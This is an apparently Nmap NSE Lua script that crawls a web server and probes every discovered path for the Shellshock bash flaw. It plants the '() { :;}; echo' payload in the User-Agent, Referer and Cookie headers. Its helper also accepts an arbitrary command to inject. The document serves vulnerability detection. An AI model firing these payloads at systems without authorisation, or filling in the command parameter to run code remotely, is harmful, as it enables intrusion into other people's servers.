local stdnse = require "stdnse"
local http = require "http"
local shortport = require "shortport"
local httpspider = require "httpspider"

description=[[

]]

author = ""
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discover", "vuln"}

portrule = shortport.http

function generate_http_req(host, port, uri, custom_header, cmd)
  local rnd = nil
  --Set custom or probe with random string as cmd
  if cmd ~= nil then
    cmd = '() { :;}; '..cmd
 else
    rnd = stdnse.generate_random_string(15)
    cmd = '() { :;}; echo; echo "'..rnd..'"'
  end
  -- Plant the payload in the HTTP headers
  local options = {header={}}
  options["bypass_cache"] = true
  if custom_header == nil then
    stdnse.debug1("Sending '%s' in HTTP headers:User-Agent,Cookie and Referer", cmd)
    options["header"]["User-Agent"] = cmd
    options["header"]["Referer"] = cmd
    options["header"]["Cookie"] = cmd
    options["header"][cmd] = cmd
  else
    stdnse.debug1("Sending '%s' in HTTP header '%s'", cmd, custom_header)
    options["header"][custom_header] = cmd
  end
  local req = http.get(host, port, uri, options)
  if not(cmd) then
    return req
  else
    return req, rnd
  end
end

action = function(host, port)
  local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/"
  local crawler = httpspider.Crawler:new( host, port, '/', { scriptname = SCRIPT_NAME } )
  local out = stdnse.output_table()
  out.urls = {}
  out.paths = {}
  out.vulns = {}
  crawler:set_timeout(10000)

  local result
  while(true) do
    local status, r = crawler:crawl()
    if ( not(status) ) then
       break
     end
  table.insert(out.urls, r.url)
  table.insert(out.paths, r.url.path)
  end

  for _, url in pairs(out.paths) do
    stdnse.debug1("Testing URL for shellshock:%s", url)
    local req, rnd = generate_http_req(host, port, url, nil, nil)
    if req.status == 200 and string.match(req.body, rnd) then
      stdnse.debug1("Found vulnerable page:%s", url)
      table.insert(out.vulns, url)
    end
  end
  return out
end
